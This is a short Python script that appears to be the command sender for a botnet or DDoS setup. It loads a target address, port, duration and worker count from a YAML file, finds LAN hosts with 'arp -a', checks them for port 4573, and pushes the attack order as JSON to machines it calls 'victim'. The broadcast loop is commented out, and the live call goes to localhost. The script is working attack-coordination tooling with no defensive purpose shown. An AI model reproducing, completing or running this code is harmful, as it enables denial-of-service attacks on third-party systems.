import subprocess
import re
import socket
import json
import requests
import yaml

with open("./destination.yaml", encoding="utf-8") as f:
    f = yaml.safe_load(f)
    address = f["Destination"]
    port = f["Port"]
    time = f["Time"]
    workers = f["Workers"]

def get_local_ips():
    try:
        ip_addresses = re.findall(r'\d+\.\d+\.\d+\.\d+', subprocess.check_output(["arp", "-a"], text=True))
    except subprocess.CalledProcessError:
        print("Error running arp -a")
        return []
    return list(set(ip_addresses))

def check_port(ip, port, timeout=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def send_json(ip, port, data):
    try:
        victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        victim.settimeout(2)
        victim.connect((ip, port))
        
        json_data = json.dumps(data)
        victim.send(json_data.encode('utf-8'))
        
        victim.close()
    except Exception as e:
        print(f"Unable connect to {ip}:{port}: {e}")

send_json('127.0.0.1', 4573, {"address": address, "port": port, 'time':time, 'workers':workers})
# send_json('0.0.0.0', 4573, {"address": address, "port": port, 'time':time})

#for ip in get_local_ips():
#    if check_port(ip, 4573):
#        print(f"Port 4573 is open on {ip}")
#        send_json(ip, 4573, {"address": address, "port": port, 'time':time})
#    else:
#        pass